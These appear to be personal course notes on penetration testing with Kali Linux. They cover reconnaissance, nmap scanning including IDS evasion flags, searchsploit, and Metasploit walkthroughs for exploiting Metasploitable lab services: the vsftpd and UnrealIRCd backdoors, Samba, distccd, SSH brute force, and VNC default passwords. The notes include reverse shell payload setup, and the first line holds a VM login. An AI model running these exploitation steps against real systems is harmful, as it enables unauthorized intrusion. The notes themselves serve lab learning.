KALIVM USERNAME:PASSWORD - mrh:2195

____________________________________________________________________
INFO GATHERING
____________________________________________________________________
ping
nslookup
ipinfo.info
whois
whatweb
theHarvester - removed from kali linux since it had problems, so cloned from github
hunter.io
redhawk(github)
sherlock(github)
email-scraper.py(course resource - present in EHRSRC)
INFO: search for new information gathering tools in online repos(eg: github) if something doesn't work that's present in kalilinux
FOR MORE: https://securitytrails.com/blog/osint-tools



____________________________________________________________________
SCANNING
____________________________________________________________________
top 10 vulnerable machines
https://www.rapid7.com/blog/post/2011/12/23/where-can-i-find-vulnerable-machines-for-my-penetration-testing-lab/

metasploitable(downloaded)

arp (show a list of all hosts connected to your related network [only shows infos those are already pinged])

netdiscover (finds all of the available hosts available on a network by broadcasting arps [better than arp])

netstat -nr (show network routing table with numeric values)

nmap-------------------------------------------------------------------------------------------------------------------------------------------------
|  NMAP SCAN TYPES
|  nmap (normally it scans famous 1000 ports but being explicit, also scans others)
|  nmap -sS <ip_addr> (TCP SYN scan)
|  nmap -sT <ip_addr> (TCP connect scan)
|  nmap -sU <ip_addr> (UDP scan)
|  nmap -O <ip_addr> (OS Fingerprinting)
|  nmap -sV <ip_addr> (Version of services running in target machine)
|  nmap -sV --version-intensity [1-9] <ip_addr> (same as above with specified intensity[default intensity - 7, i.e default for above cmd])
|  nmap -A <ip>  (alternative to -O,-sV,nmap script scanning and as the flag suggests, scans aggressively)
|  nmap -sn <ip/ip-range> (no port scan [similar to netdiscover cmd])
|  
|  NMAP PORT & SPECS
|  nmap -p [<port_number>] [<p1>,<p2>,...,<pn>] [plow-phigh] <ip_addr> (scan for specific port numbers)
|  nmap -p- <ip_addr> (scan all ports)
|  nmap -F <ip_addr> (scan top 100 ports that are used mostly)
|  nmap -oN <output_filename> <other flag_misc> (stdo to file and console)
|  
|  NMAP EVADE FW & IDS
|  nmap -f <ip_addr> (fragment ip packet into several parts while pinging) [on adding another -f, 8 fragments add up to divide packet again by +8 i.e. 16 fragments but on real some program can't handle these types of tiny packets]
|  nmap --mtu <multiple of 8> <ip_addr> (above's multiple -f flags alternative)
|  nmap -D RND:<number of decoys> <ip_addr> (send n  number of packets as if even different ip addressed computers along with u tried to send packets just to make IDS confused)
|  nmap -D <random_private_ip1,ip2,...,ME <target_ip> (here ME is your local IP)
|  NOTE: above 1st decoy cmd works best for targets that are on another network, 2nd decoy cmd are for targets within the same network. [for behind the scenes use wireshark to know random ip_addrs used]

TIP: Zenmap for GUI XP of nmap
NOTE: to view progress & ETA for longer scan, press UP arrow
FOR MORE: https://nmap.org/book/man.html



____________________________________________________________________
VULNERABILITY ANALYSIS
____________________________________________________________________
before analyzing, try not to reinvent the wheel cause there might be exploits found for a specific service already!

(NMAP) nmap scripts location: usr/share/nmap/scripts
To run a script: nmap --script [<script_category>|<specific_script>] <target> <scan-type>
<script_category> = firewall | exploit | banner | malware | auth ->>AND MORE....
FOR MORE: https://nmap.org/book/nse-usage.html
Description about the script: nmap --script-help <script_name.nse>

searchsploit(kali linux) in cmd
eg: searchsploit <servicename_/w_version(as present in nmap -sV result)>
after searching, result shows 2 columns(exploit title, path)
in path it shows partial path to the exploit script eg: linux/remote/16922.rb
so copy the exploit filename and search for the file using locate cmd,
i.e.> locate 16922.rb (exploits are by default present in kali linux and not in other linux distros)
then run the script wrt the extension of the script

nessus : https://www.tenable.com/downloads/nessus
to install : sudo dpkg -i <nessus_filename>
logon to: https://kali:8834/ (port number might vary, but when starting the nessus service try to check the printed description while switching it on)



____________________________________________________________________
EXPLOITATION & GAINING ACCESS 
____________________________________________________________________

FEW IMPORTANT TERMINOLOGIES AND DEFS:
	PAYLOAD : payload is the part of the private user text which could also contain malware such as worms or viruses which performs the malicious action
	EXPLOIT: piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability
		TIP: the best analogy to understand the difference bet. exploit & payload is that an exploit is the way to create a pipeline and the payload is the script that's used to perform all sorts of stuffs in the target system using that pipeline
	BIND SHELL : have the listener(basically it means opening a port so that a service runs in that port) running on the target and the attacker connect to the listener in order to gain a remote shell.(due to firewall, port opening restrictions might be present in target system, creating a bind shell might not work in some cases)
	REVERSE SHELL : have the listener running on the attacker and the target connects to the attacker with a shell.(the target tries to connect to the attacker's specific open port)

(msfconsole)metasploit-framework-------------------------------------------------------------------------------------------------------------------------------------------------
location in kali linux: /usr/share/metasploit-framework/
some important files defs inside the above folder as follows:
	msfconsole - to open the metasploit-framework in cmd
	msfvenom - tool to generate payload/shell
	modules/ - folder consisting of all frameworks in metasploit
		exploits/ - program execute set of command in target machine to gain access like Buffer overflow, RCE etc
		auxiliary/ - not a payload but performs actions like scanning(such as version, eg: bruteforce login panels for ssh), fuzzing, DOS attacks etc(sometimes used in first 2 stages of penetration testing)
		post/ - as the name suggests post exploitation module that's usually used after successfully gaining access to the target device and get info such as files, hashes etc
		payloads/ - some code that's delivered to target to exploit the target machine
			singles/ - payloads that are standalone, eg: adding a user to the target system etc
			stagers/ - setup a network connection between attacker and target system and designed to be small & reliable and done by shells(reverse, bind)[tcp & udp]
			stages/ - payload components that are downloaded by stagers modules, can provide adv. feats. /w no size limits
		encoders/ - helps evading anti virus detection(normally for us a payload's a script but for targets its a virus so this help to encode and make payloads less detectable by the antivirus)
		evasion/ - pretty much the same as encoders/
		nops/ - (no operation) instruction for the processor which means do nothing(useful to execute buffer overflow attacks) 

TIP: (in msfconsole, we can also run normal linux cmds such as: ifconfig, ls, cd within without the help of opening another terminal)

MSFCONSOLE BASIC CMDS, MODULE SELECTION AND AHEAD:(TO REM: the thing we do everytime in mfsc is use a module/ by selecting an exploit, then set options for the module/, the payload and the target and finally exploit!)
> help (for help manual)
> show payloads (list all available payloads present in /usr/share/metasploit-framework/ which shows columns such as number, name etc
> show exploits (same as above but shows all exploits)
> sessions (shows sessions that are initialized with target's machine)
> use <name_from_the_show_list> (to use an exploit. Eg: use exploit/windows/smb/ms06_040_netapi)
after the above module is selected to view all info/description about it:
> show info (to view the code we can get to the msf location[/usr/share/metasploit-framework/] and get to the relative modules folder)
we need to setup options for the module that we're gonna use, so the following cmd shows what all options are available to configure the specific module you've chosen
> show options
basically it shows 3 different options:
	module options: options to setup the target's info such as ip_addr, port (RHOSTS,RPORT) etc
	payload options: options to setup the attacker's system such as when creating a rev_tcp_shell we need to give attacker's ip, port (LHOST,LPORT) etc(basically it is setup already for us by msf itself)
	exploit targets: shows all the vulnerable targets available predefined for the particular module/ selected(it could be a software or for a specific OS that's running in the target system) Eg: list of specific exploits for win10, win7 etc or in case a software it is by default no specialization takes place 
to set an option the following cmd is used:
> set <option_name> <value/s> (eg: set LHOST 192.168.1.15)
we can again use "show options" to see if the value changed is set

we can also change the payload but usually what msf gave as its best but sometimes it might not work.
but still we can change the payload for a specifically selected module/ by listing the payloads using "show payloads" but this time only the possible payloads will be listed for that specific module/
after that we can copy the name of the payload and type the foll. cmd:
> set payload <payload_name> (make sure while setting a rev. or bind shell while setting the payload option,change respective ip_addr, ports (RHOST, LHOST, LPORT, RPORT) needs to be changed)
to list all targets we can use "show targets" and to set use the foll. cmd:
> set target <id_number>
if no specific target info is known an "Automatic" option would be present in targets but only scopes within the known targets and not others. Eg: if targets are present for win10,win7, Automatic doesn't work out for winXP
and finally to execute the setup we've did so far the foll. cmd is used:
> exploit

MSFCONSOLE OTHER MISC:
to search a specific software service:
> search <software_name> (basically the software_name is found out from the nmap service scan without the version of the software itself)

[VIDEO (vsftpd - FIRST VULNERABILITY EXPLOITATION)]:
	start scanning metasploitable VM using nmap (-sV) and 
	then use searchsploit to search for the service /w version whether we have an exploit for that and check whether metasploit version of exploit is available
	if its available goto metasploit and do "search <software_name>" and select the matching version with "use <exploit_loc>" and the above following steps as done
Eg: Exploiting vsftpd 2.3.4
> use exploit/unix/ftp/vsftpd_234_backdoor
> set <params> <param_value>
> exploit

[VIDEO (BindShell Misconfiguration - basically a metasploitable shell that's opened without any username or password unconfigured)]
NC(Netcat):
> nc -h (help menu)[pretty much the whole help page is self explanatory]
eg: to connect to a service: nc <ip_addr> <port_number>

[VIDEO (Telnet Exploitation - similar to above but with default username & password that's not changed)]
to access telnet in cmd:
> telnet <ip_addr>

[VIDEO (Samba Exploitation - here we tend to find out the exact version of samba before exploiting)]
after scanning in nmap (-sV) we tend to find out the partial version of samba service but 
we to find the exact version we use msfconsole and in it using the auxiliary module we have a submodule called scanner and within it we have specifics to smb(samba).
so using autocomplete feature we can enter the foll. cmd:
> use auxiliary/scanner/smb/[PRESS_TAB] (here [PRESS_TAB] literally means pressing the tab button in your keyboard to view all possibilities)
the rest shows available scanner scripts and from that we select the following:
> use auxiliary/scanner/smb/smb_version (since we wanna scan the version of smb we select it)
after selecting the auxiliary, we setup the necessary options(such as RHOSTS) and then enter 'run'
Now after finding the exact version of smb we search for an exploit for that particular version using:
> searchsploit Samba 3.0.20
we get a metasploit module from the search result. i.e: 'Username' map script' Command Execution 
so to search and use that script in msfconsole we enter:
> search exploit samba
in result check for the keyword 'username' in description column and note its particular name which is the following and to use it:
> use exploit/multi/samba/usermap_script' (here multi/ says that this exploit works for different OS)
again we set options(RHOSTS) and run it using 'exploit' cmd to gain root access 

[VIDEO (SSH Exploitation - here we brute force usernames(n), passwords(m)[nxm combinations] to check whether weak passwords are set)]
here we use one of the auxiliary module to brute login to SSH so we search:
> search auxiliary scanner ssh
from the result we search for a script description: 'SSH Login Check Scanner'.This script allows us to bruteforce SSH target so we use it as follows:
> use auxiliary/scanner/ssh/ssh_login
Now in options we set RHOSTS and 2 other main params (USER_FILE,PASS_FILE).
as we're bruteforcing the SSH those are mandatory so for both the USER_FILE, PASS_FILE we enter the location of a .txt file that contains usernames and passwords 1/line
so we enter the absolute path of those txt files for both those brute params as follows:
> set USER_FILE /home/$(whoami)/Desktop/usernames.txt
> set PASS_FILE /home/$(whoami)/Desktop/passwords.txt
now we can run 'exploit' or even set another option called 'VERBOSE' to true to get detailed info about the brute process
Now you might use the shell to execute commands in the target's machine so in msfc using a cmd called:
> sessions (displays all the sessions compromised in target's system so far)
from that we can note the Id of the session from the Id column and use the following cmd to start interacting with the target machine:
> sessions -i <Id>
since we got the username, password of the SSH we can use the normal of accessing it as follows:
> ssh <username>@<ip_addr> (after initalization, asks for password )
eg: ssh msfadmin@192.168.1.98

[VIDEO (Unreal IRCd backdoor Command Execution(CE))]
here after nmap -sV we get the info UnrealIRCd running in 6667
search for the following:
> searchsploit unrealircd (a BCE exploit in metasploit is found)
search in msfc:
> search unrealircd (one result shown same as in searchsploit)
select it by entering "use 0"(since that's the only exploit shown i.e. exploit/unix/irc/unreal_ircd_3281_backdoor)
set all options and default payload wont be setup so use the following:
> set payload [PRESS_TAB] (shows all possible shell payloads), eg:
> set payload /cmd/unix/reverse
since we've selected reverse shell we set the ip for LHOST
then 'exploit'

[VIDEO (distccd Arbitrary Command Execution(ACE))]
search 'ccd' in msfc and select the following:
> use exploit/unix/misc/distcc_exec
set options (RHOSTS, LHOST[if revshell is set as payload]) and 'exploit'

[VIDEO (Ruby DRb RMI Command Execution)]
in this case we search for ruby drb but we get no luck in msfc so using searchsploit we find out the exploit named as 'Distributed Ruby - Send instance_eval/syscall Code Execution (Metasploit)'
but in msf6 it is not present, so we need to proceed with the searchsploit by find out the path of that script which is done the following cmd:
> searchsploit -p <path_column_number> (in our case path_column_number = 17058)
try copying the file to the msf's linux/misc module and execute it in msfc as follows:
> use exploit/linux/misc/<name_of_script>.rb
set options and 'exploit'

[VIDEO (VNC Protocol 3.3 (Default Password))]
using vncviewer application in Kali linux we can connect it with the default password as follows:
> vncviewer <target_ip> (default password: password)
